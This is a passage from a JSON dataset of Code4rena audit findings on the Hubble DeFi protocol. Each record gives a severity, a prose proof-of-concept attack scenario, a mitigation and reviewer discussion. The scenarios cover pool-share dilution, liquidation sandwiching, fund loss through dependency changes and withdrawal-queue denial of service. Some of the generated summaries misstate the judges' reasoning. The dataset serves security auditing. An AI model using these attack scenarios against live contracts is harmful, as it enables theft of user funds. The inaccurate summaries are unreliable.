      "summary": "\nThe bug report states that there is a problem with the VUSD withdraw queue. When a user requests a withdraw of zero value and the reserve token does not support zero value transfers, the queue will be blocked and the user's funds will be frozen. This can happen with any reserve token, not just USDC. The report also provides a proof of concept and suggests adding a zero amount check to mitigate the issue. However, one of the developers disputes the issue, stating that the reserve token is intended to be USDC and it is not specified in the audit's specification. The report has been given to the submitter for review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/29",
      "tags": [],
      "finders": []
    },
    {
      "id": "42477",
      "title": "[M-09] Ownership of `Swap.vy` cannot be transferred",
      "impact": "MEDIUM",
      "content": "_Submitted by gzeon_\n\nOwnership transfer function of Swap.vy is commented out. Fund can be stuck if an AMM and governance change/upgrade is required.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L1129>\n\n**[atvanguard (Hubble) disputed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/93#issuecomment-1049565326):**\n > Intended behavior because we don't use `self.owner` after the initial setup.\n\n**[JasoonS (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/93#issuecomment-1060013853):**\n> If that is the case, then shouldn't this function have a check that the AMM can't be set multiple times?\n> https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/curve-v2/Swap.vy#L966-L970\n> \n> There is risk if the owner keys get compromised - also there is no progressive security if you can't change this.\n> \n> IE it could start as an EOA - and progress to a multisig owner etc.\n> \n> Leaving at medium severity - if you have an owner, there should always be a way to update it as to improve the security (and potentially decentralization) of the system over time.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a problem with the ownership transfer function in Swap.vy. This function is currently commented out, which means that it is not working properly. This can cause issues if there is a need to change or upgrade the governance of the system. The report includes a link to the code and comments from other users who have noticed this issue. One user suggests that there should be a check to prevent the AMM from being set multiple times, and another user points out that this lack of functionality could pose a security risk. The report concludes by stating that this bug is currently considered to be of medium severity, as it is important to have a way to update the ownership in order to improve the security and decentralization of the system over time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/93",
      "tags": [],
      "finders": []
    },
    {
      "id": "42476",
      "title": "[M-06] After debt seizure from `InsuranceFund`, user can dilute all past participants.",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xliumin_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L56><br>\n\nA user can get a much larger portion of the pool as it recovers from a debt seizure. The intent of the insurance pool seems to be that it could recover from a bad debt event.\n\n### Proof of Concept\n\n1.  Alice is the first LP to the insurance pool, and deposits 1e18 shares.\n2.  `seizeBadDebt` is called with 2e18. Now, there are `pendingObligations = 1e18`, and there is 0 vusd in the insurance fund.\n3.  Bob (the attacker) directly transfers 1e18 + 1 vUSD.\n4.  Bob calls deposit with 1e18 vUSD. All pending obligations will be settled, but there will only be 1 vUSD left in the pool before Bob's deposit. Bob receives `shares = 1e18 * 1e18 / 1`. As a result, Bob will get `1e36` shares, diluting Alice's share of the pool. Bob will be able to take a much larger share of all future profits from the insurance fund until more bad debt is seized. Bob only provided 2e18 + 1 liqudiity, but received an exponentially larger number of shares than Alice.\n\n### Recommended Mitigation Steps\n\nIt depends on how you want this to work. You could keep track of the total amount ever contributed by users, and use that for calculations. Or just make staking 1 vUSD = 1 share if the pool total is below the total number of shares.\n\n**[atvanguard (Hubble) disputed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/129#issuecomment-1055797267):**\n > Disputing this. It is by design. LPs who were in the insurance fund will be burnt during a bad debt settlement.\n\n**[JasoonS (judge) decreased severity to Medium](https://github.com/code-423n4/2022-02-hubble-findings/issues/129)**\n\n\n\n***\n\n",
      "summary": "\nThe bug report describes an issue with the InsuranceFund smart contract. It allows a user to receive a disproportionately large share of the pool's profits after a bad debt event. This can happen if the user deposits more funds after the bad debt event has occurred. The recommended mitigation steps include keeping track of the total amount contributed by users or setting a limit on the number of shares a user can receive. The severity of the bug has been decreased to medium by the judge, as it is by design and not a critical issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/129",
      "tags": [],
      "finders": []
    },
    {
      "id": "42475",
      "title": "[M-05] `Oracle.getUnderlyingPrice` could have wrong decimals",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L34><br>\n\nThe `Oracle.getUnderlyingPrice` function divides the chainlink price by `100`.<br>\nIt probably assumes that the answer for the underlying is in 8 decimals but then wants to reduce it for 6 decimals to match USDC.\n\nHowever, arbitrary `underlying` tokens are used and the chainlink oracles can have different decimals.\n\n### Recommended Mitigation Steps\n\nWhile most USD price feeds use 8 decimals, it's better to take the on-chain reported decimals into account by doing `AggregatorV3Interface(chainLinkAggregatorMap[underlying]).decimals()`, see [Chainlink docs](https://docs.chain.link/docs/get-the-latest-price/#getting-a-different-price-denomination).<br>\nThe price should then be scaled down to 6 decimals.\n\n**[atvanguard (Hubble) confirmed, but disagreed with High severity and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/44#issuecomment-1049511584):**\n > All chainlink USD pairings are expected to have 8 decimals hence disagreeing with severity; but yes agree that asserting this check when adding a new asset is a good idea. \n\n**[moose-code (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/44#issuecomment-1059976567):**\n > Downgrading to medium. Dividing by magic numbers (100) should clearly comment assumptions.\n\n\n\n***\n\n",
      "summary": "\nThe Oracle.getUnderlyingPrice function in the code has a bug where it divides the chainlink price by 100, assuming that the answer for the underlying is in 8 decimals and needs to be reduced to 6 decimals to match USDC. However, this may not be accurate for all tokens and chainlink oracles can have different decimals. The recommended mitigation steps suggest taking into account the on-chain reported decimals and scaling down the price to 6 decimals. The severity of the bug was initially marked as high, but was later downgraded to medium as it was found to be caused by dividing by magic numbers (100) and not considering all possible scenarios.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/44",
      "tags": [],
      "finders": []
    },
    {
      "id": "42474",
      "title": "[M-04] `settleFunding` will exceed block gas with more markets and activity",
      "impact": "MEDIUM",
      "content": "_Submitted by bw, also found by cmichel, Dravee, gzeon, Omik, and Ruhum_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/ClearingHouse.sol#L129><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L678>\n\nAs the number of supported markets grow, `settleFunding` will reach a point were it exceeds the block gas limit on Avalanche C-Chain. This will prevent users from calling the function and cause a wide spread Denial of Service.\n\nLooking at transactions for the current testnet deployment, `settleFunding` already reaches almost 10% of the block gas limit. This is due settle funding iteratively looping through each market, with each iteration entering an unbounded `while` loop in `_calcTwap`. The more active the markets are, the more gas intensive `_calcTwap` becomes, as more snapshots need to be traversed.\n\nThe combination of more active markets and an increase in available markets make it very likely that some users will be unable to call `settleFunding` in the long run.\n\n### Proof of Concept\n\nExample of transactions on testnet:\n\n| Gas    | Limit% | Link                                                                                                 |\n| ------ | ------ | ---------------------------------------------------------------------------------------------------- |\n| 658428 | 8.2%   | <https://testnet.snowtrace.io/tx/0x8123a5658a98e694e7428e66c9e5f9d5cbff8af93d543ed51a80cb367bcccd2c> |\n| 653810 | 8.1%   | <https://testnet.snowtrace.io/tx/0xf126eb05245580a73981228d6f0f8d607ad038ca0b68593f0c903e210c1c2c57> |\n\n### Recommended Mitigation Steps\n\nUsers should be allowed to settle funding per market or using an array of markets opposed to all markets at once.\n\n```solidity\nfunction settleFundingForMarkets(IAMM[] markets) override external whenNotPaused {\n     for (uint i = 0; i < markets.length; i++) {\n          markets[i].settleFunding();\n     }\n}\n```\n\nIn this way the gas cost will not increase with the number of markets created over time.\n\n**[atvanguard (Hubble) acknowledged, but disagreed with High severity and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/97#issuecomment-1049492999):**\n > It's a known issue that adding many more markets will eventually exceed block gas limit on many operations (not just `settleFunding`). For that reason, DAO governance has to be careful with not adding too many markets. Would classify this as `0 (Informational)`.\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/97#issuecomment-1059975203):**\n > This is definitely more than informational. You can see in the gas profiler on only a limited amount of markets with not much action, lots of gas was used. This has potential to be a much bigger issue in the future. \n> \n> Very rightly so the warden points out `_calcTwap` as intensive which is shown on the profiler below for the one market. Calculating a TWAP across many different markets could blow this function up very quickly. \n> \n> Further more, if you take ALL the gas in a single block, this becomes really expensive and difficult as you need to push out a lot of other high priority transactions that are pending. If this was needing to be executed during an NFT minting spree it would be tough.\n> \n> ![image](https://user-images.githubusercontent.com/20556729/156927846-bbd71770-ea09-4e3e-bffb-83256e665398.png)\n> \n> @JasoonS, let's discuss on medium vs high for this one. \n\n**[moose-code (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/97#issuecomment-1059985901):**\n > Going to have this as medium. \n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a potential issue with the `settleFunding` function in the Hubble protocol. This function is used to settle funding for all markets in the protocol, but as the number of markets grows, it may exceed the block gas limit on Avalanche C-Chain. This could cause a Denial of Service and prevent users from calling the function. The report includes a proof of concept with examples of transactions that have already reached a high percentage of the block gas limit. The recommended mitigation steps suggest allowing users to settle funding for individual markets or an array of markets instead of all markets at once. The severity of the bug was initially classified as High, but after further discussion, it was decreased to Medium. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/97",
      "tags": [],
      "finders": []
    },
    {
      "id": "4215",
      "title": "[L-09] Missing Pause Modifier On the InsuranceFunds contract",
      "impact": "LOW",
      "content": "\nIn case a hack occurs or an exploit is discovered, the team should be able to pause functionality until the necessary changes are made to the system.  The deposits should be paused with Pause modifier.\n\n### Proof of Concept\n\nNavigate to the following contract functions:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/InsuranceFund.sol#L39><br>\n\nThere is no pause mechanism has been defined.\n\n### Recommended Mitigation Steps\n\nPause functionality on the contract would have helped secure the funds quickly.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-09-missing-pause-modifier-on-the-insurancefunds-contract",
      "tags": [],
      "finders": []
    },
    {
      "id": "4214",
      "title": "[L-08] The Contract Should Approve(0) first",
      "impact": "LOW",
      "content": "\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.<br>\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n### Proof of Concept\n\nNavigate to the following contract functions:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccountHelper.sol#L24>\n\n### Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-08-the-contract-should-approve0-first",
      "tags": [],
      "finders": []
    },
    {
      "id": "4213",
      "title": "[L-07] Deprecated safeApprove() function",
      "impact": "LOW",
      "content": "\nDetailed description of the impact of this finding.\n\nUsing this deprecated function can lead to unintended reverts and potentially the locking of funds. A deeper discussion on the deprecation of this function is in [OZ issue #2219](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2219). The OpenZeppelin ERC20 `safeApprove()` function has been deprecated, as seen in the comments of the OpenZeppelin code.\n\n### Proof of Concept\n\nNavigate to the following contract functions:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccountHelper.sol#L24>\n\n### Recommended Mitigation Steps\n\nAs suggested by the OpenZeppelin comment, replace `safeApprove()` with `safeIncreaseAllowance()` or `safeDecreaseAllowance()` instead.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-07-deprecated-safeapprove-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4212",
      "title": "[L-06] Missing events for governor only functions that change critical parameters",
      "impact": "LOW",
      "content": "\nThe governor only functions that change critical parameters should emit events. Events allow capturing the changed parameters so that off-chain tools/interfaces can register such changes with timelocks that allow users to evaluate them and consider if they would like to engage/exit based on how they perceive the changes as affecting the trustworthiness of the protocol or profitability of the implemented financial services. The alternative of directly querying on-chain contract state for such changes is not considered practical for most users/usages.\n\nMissing events and timelocks do not promote transparency and if such changes immediately affect users perception of fairness or trustworthiness, they could exit the protocol causing a reduction in liquidity which could negatively impact protocol TVL and reputation.\n\nThere are owner functions that do not emit any events in the contracts.\n\n### Proof of Concept\n\nNavigate to the following contracts:\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccount.sol#L616><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/legos/Governable.sol#L19><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L162><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/VUSD.sol#L74><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/AMM.sol#L722><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/AMM.sol#L737><br>\n\nSee similar High-severity H03 finding [OpenZeppelins Audit of Audius](https://blog.openzeppelin.com/audius-contracts-audit/#high) and Medium-severity M01 finding [OpenZeppelins Audit of UMA Phase 4](https://blog.openzeppelin.com/uma-audit-phase-4/).\n\n### Recommended Mitigation Steps\n\nAdd events to all admin/privileged functions that change critical parameters.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-06-missing-events-for-governor-only-functions-that-change-critical-parameters",
      "tags": [],
      "finders": []
    },
    {
      "id": "4211",
      "title": "[L-05] Missing zero-address check in constructors and the setter functions",
      "impact": "LOW",
      "content": "\nMissing checks for zero-addresses may lead to infunctional protocol, if the variable addresses are updated incorrectly.\n\n### Proof of Concept\n\nNavigate to the following contract functions:\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccountHelper.sol#L19><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/VUSD.sol#L39><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/legos/Governable.sol#L16><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/InsuranceFund.sol#L35><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccount.sol#L121><br>\n\n### Recommended Mitigation Steps\n\nConsider adding zero-address checks in the discussed constructors:<br>\nrequire(newAddr != address(0));.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-05-missing-zero-address-check-in-constructors-and-the-setter-functions",
      "tags": [],
      "finders": []
    },
    {
      "id": "4210",
      "title": "[L-04] Incompatibility With Rebasing/Deflationary/Inflationary tokens",
      "impact": "LOW",
      "content": "\nThe protocol do not appear to support rebasing/deflationary/inflationary tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.\n\n### Proof of Concept\n\nNavigate to the following contracts:\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccount.sol#L155><br>\n\n* <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccountHelper.sol#L29><br>\n\n### Recommended Mitigation Steps\n\n- Ensure that to check previous balance/after balance  equals to amount for any rebasing/inflation/deflation\n- Add support in contracts for such tokens before accepting user-supplied tokens\n- Consider supporting deflationary / rebasing / etc tokens by extra checking the balances before/after or strictly inform your users not to use such tokens if they don't want to lose them.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-04-incompatibility-with-rebasingdeflationaryinflationary-tokens",
      "tags": [],
      "finders": []
    },
    {
      "id": "4209",
      "title": "[L-03] Front-runnable Initializers",
      "impact": "LOW",
      "content": "\nAll contract **initializers** were missing access controls, allowing any user to initialize the contract. By front-running the contract deployers to initialize the contract, the incorrect parameters may be supplied, leaving the contract needing to be redeployed.\n\n### Proof of Concept\n\n1. Navigate to the following contracts:\n\n    * <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/AMM.sol#L93><br>\n\n    * <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/Oracle.sol#L20><br>\n\n    * <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/VUSD.sol#L38><br>\n\n    * <https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/MarginAccount.sol#L121><br>\n\n2. Initialize functions does not have access control. They are vulnerable to front-running.\n\n### Recommended Mitigation Steps\n\nWhile the code that can be run in contract constructors is limited, setting the owner in the contract's constructor to the `msg.sender` and adding the `onlyOwner` modifier to all **initializers** would be a sufficient level of access control.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-03-front-runnable-initializers",
      "tags": [],
      "finders": []
    },
    {
      "id": "4208",
      "title": "[L-02] Single-step change of governance address is extremely risky",
      "impact": "LOW",
      "content": "\nSingle-step change of critical governance address and lack of zero address check is extremely risky. If a zero address or incorrect address (private key not available) is used accidentally, or maliciously changed by a compromised governance account then the entire governance of the protocol is locked forever or lost to an attacker. No governance changes can be made by authorized governance account and protocol will have to be redeployed. The reputation of the protocol will take a huge hit. There may be significant fund lock/loss as well.\n\nInterestingly, this 2-step process is applied to the changing of Strategist address but not Governance address. Governance has more authority in the protocol because it can change the Strategist among other things. So this 2-step should definitely be applied to Governance as well.\n\nGiven the magnitude of the impact, i.e. permanent lock of all governance actions, potential lock/loss of funds, and the known/documented failures of wallet opsec, this risk is classified as medium severity.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L20>\n\n### Recommended Mitigation Steps\n\nChange of the most critical protocol address i.e. governance should be timelocked and be a 2-step process: approve+claim in two different transactions, instead of a single-step change.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-02-single-step-change-of-governance-address-is-extremely-risky",
      "tags": [],
      "finders": []
    },
    {
      "id": "4207",
      "title": "[L-01]  PREVENT DIV BY 0",
      "impact": "LOW",
      "content": "\nOn several locations in the code precautions are taken not to divide by 0, because this will revert the code. However on some locations this isnt done.\n\nOracle price is not checked. That will cause to revert on the several functions.\n\n### Proof of Concept\n\nNavigate to the following contract:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/Oracle.sol#L34>\n\n### Recommended Mitigation Steps\n\nRecommend making sure division by 0 wont occur by checking the variables beforehand and handling this edge case.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "#l-01--prevent-div-by-0",
      "tags": [],
      "finders": []
    },
    {
      "id": "1534",
      "title": "[M-17] Usage of an incorrect version of Ownable library can potentially malfunction all onlyOwner functions",
      "impact": "MEDIUM",
      "content": "Title: Usage of an incorrect version of Ownbale library can potentially malfunction all onlyOwner functions\r\nSeverity: High Risk",
      "summary": "\nThis bug report is about an issue with the Ownable library. The issue is that if the wrong version of the library is used, it can cause all onlyOwner functions to malfunction. This is considered to be a high risk issue, and should be addressed as soon as possible. \n\nThe Ownable library is a library used in Ethereum smart contracts. It provides a set of functions that allow a contract to be owned by an Ethereum address. This address is known as the owner, and they have the ability to perform certain actions within the contract. \n\nThe issue in this bug report is that if the wrong version of the Ownable library is used, it can cause all onlyOwner functions to malfunction. This means that the owner will not be able to perform the actions they are supposed to be able to do. This is a serious issue as it could lead to the contract not functioning as intended, and could cause serious problems for users of the contract.\n\nIt is important to make sure that the correct version of the Ownable library is used in order to avoid this issue. If the wrong version is used, it is important to update it as soon as possible in order to prevent any potential issues. \n\nIn conclusion, this bug report is about an issue with the Ownable library where using an incorrect version of the library can cause all onlyOwner functions to malfunction. This is a high risk issue and should be addressed as soon as possible. It is important to make sure that the correct version of the Ownable library is used in order to avoid any potential issues.",
      "quality_score": 1,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/140",
      "tags": [],
      "finders": [
        "robee"
      ]
    },
    {
      "id": "1533",
      "title": "[M-16] USDC blacklisted accounts can DoS the withdrawal system",
      "impact": "MEDIUM",
      "content": "_Submitted by throttle_\n\nDoS of USDC withdrawal system\n\n### Proof of Concept\n\nCurrently, withdrawals are queued in an array and processed sequentially in a for loop.<br>\nHowever, a `safeTransfer()` to USDC blacklisted user will fail. It will also brick the withdrawal system because the blacklisted user is never cleared.\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L53-L67>\n\n### Recommended Mitigation Steps\n\nPossible solutions:<br>\n1st solution:<br>\nImplement 2-step withdrawals:<br>\n\\- In a for loop, increase the user's amount that can be safely withdrawn.<br>\n\\- A user himself withdraws his balance<br>\n\n2nd solution:<br>\nSkip blacklisted users in a processWithdrawals loop\n\n**[atvanguard (Hubble) confirmed](https://github.com/code-423n4/2022-02-hubble-findings/issues/76)**\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/76#issuecomment-1059987539):**\n > Interesting! Yes, this would be bad.\n\n\n\n***\n\n",
      "summary": "\nThis bug report describes a vulnerability in the USDC withdrawal system of the 2022-02-hubble project. This vulnerability can cause a Denial of Service (DoS) attack of the USDC withdrawal system. It occurs when a user tries to make a withdrawal to a blacklisted user. This causes the withdrawal system to be bricked since the blacklisted user is never cleared. The vulnerability was identified through manual review. Possible solutions to mitigate the vulnerability are to implement 2-step withdrawals or to skip blacklisted users in the processWithdrawals loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/76",
      "tags": [],
      "finders": [
        "throttle"
      ]
    },
    {
      "id": "1532",
      "title": "[M-15] [WP-H7] InsuranceFund#syncDeps() may cause users fund loss",
      "impact": "MEDIUM",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    vusd = IERC20(_registry.vusd());\n    marginAccount = _registry.marginAccount();\n}\n```\n\nThe `Governance` address can call `InsuranceFund.sol#syncDeps()` to change the contract address of `vusd` anytime.\n\nHowever, since the tx to set a new address for `vusd` can get in between users' txs to deposit and withdraw, in some edge cases, it can result in users' loss of funds.\n\n### PoC\n\n1. Alice deposited `1,000,000 VUSD` to `InsuranceFund`;\n2. Gov called `syncDeps()` and set `vusd` to the address of `VUSDv2`;\n3. Alice called `withdraw()` with all the `shares` and get back `0 VUSDv2`.\n\nAs a result, Alice suffered a fund loss of `1,000,000 VUSD`.\n\n### Recommendation\n\n1. Consider making `vusd` unchangeable;\n2. If a possible migration of `vusd` must be considered, consider changing the `syncDeps()` to:\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    uint _balance = balance();\n    vusd = IERC20(_registry.vusd());\n    require(balance() >= _balance);\n    marginAccount = _registry.marginAccount();\n}\n```",
      "summary": "\nThis bug report is about a vulnerability in the InsuranceFund.sol contract which can result in users' loss of funds. The vulnerability is caused by the Governance address being able to call the syncDeps() function to change the contract address of vusd anytime. This could result in a user depositing funds, the Governance address changing the address of vusd, and the user withdrawing a different amount than they deposited. \n\nTo demonstrate the vulnerability, a proof-of-concept (PoC) was presented. In this PoC, Alice deposited 1,000,000 VUSD to InsuranceFund, the Governance address changed the address of vusd, and Alice called withdraw with all the shares and received 0 VUSDv2, resulting in a fund loss of 1,000,000 VUSD. \n\nTo address this issue, two recommendations are made. The first is to consider making vusd unchangeable. If this is not possible, the second recommendation is to change the syncDeps() function to ensure the balance of the contract is maintained.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/100",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1531",
      "title": "[M-14] Liquidation is vulnerable to sandwich attacks",
      "impact": "MEDIUM",
      "content": "_Submitted by danb, also found by leastwood_\n\nWhen an account is liquidated, there is no minimum amount of the swap, which makes it vulnerable for sandwich attacks.\n\n### Proof of Concept\n\nAlice's long position can be liquidated, bob notices it and creates a short position,<br>\nthen liquidates her position, thus swapping the base asset to the quote asset,<br>\ntherefore reducing the base asset price,<br>\nthen he redeems his short position and profits because the price went down.\n\n### Recommended Mitigation Steps\n\nSet quoteAssetLimit in `_reducePosition` to prevent the attack.\n\n**[atvanguard (Hubble) disputed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/113#issuecomment-1049483200):**\n > This is a known issue and is already [documented as a @todo](https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L142) in the code.\n\n**[moose-code (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/113#issuecomment-1063373394):**\n > After long discussion we are going to side with warden on this one. The todo is a bit sparse and the warden really digs on what precautions need to be put in place and the ramifications if they are not adhered. In general, think sprinkle of todos should not indemnify issues related around them as this might let things slip through cracks as wardens will ignore these critical pieces.  \n>\n> With the caveat of putting this in the medium and not high risk category.\n\n\n\n***\n\n",
      "summary": "\nA bug was found in the code of a decentralized application called AMM.sol. This bug makes the application vulnerable to a type of attack called a sandwich attack. In a sandwich attack, Alice would open a long position and Bob would notice it and open a short position. Bob would then liquidate Alice's position, swapping the base asset to the quote asset and reducing the base asset price. Bob would then redeem his short position and profit from the reduced base asset price. The recommended mitigation step to prevent this attack is to set a quoteAssetLimit in the _reducePosition function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/113",
      "tags": [],
      "finders": [
        "danb",
        "leastwood"
      ]
    },
    {
      "id": "1530",
